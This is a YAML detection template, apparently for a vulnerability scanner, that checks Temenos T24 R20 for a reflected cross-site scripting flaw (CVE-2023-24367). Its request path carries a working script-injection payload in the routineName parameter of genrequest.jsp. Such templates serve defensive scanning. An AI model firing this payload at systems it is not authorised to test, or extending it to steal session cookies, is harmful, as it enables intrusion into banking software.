id: "temenos-t24-xss"
name: "Temenos T24 R20 - Cross-Site Scripting"
severity: "medium"
description: "Temenos T24 release 20 contains a reflected cross-site scripting vulnerability via the routineName parameter at genrequest.jsp. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks."
tech:
  - "tomcat"
  - "java"
tags:
  - "xss"
  - "temenos"
  - "vuln"
cwe: "CWE-79"
reference: "https://github.com/mrojz/T24/blob/main/CVE-2023-24367.md"
spaExclusion: true
request:
  method: "GET"
  path: "/jsps/genrequest.jsp?routineName=\"><script>alert(document.domain)</script>"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "<script>alert(document.domain)</script>"
      - "<title>Processing...</title>"
    condition: "and"
  - type: "status"
    status:
      - 200
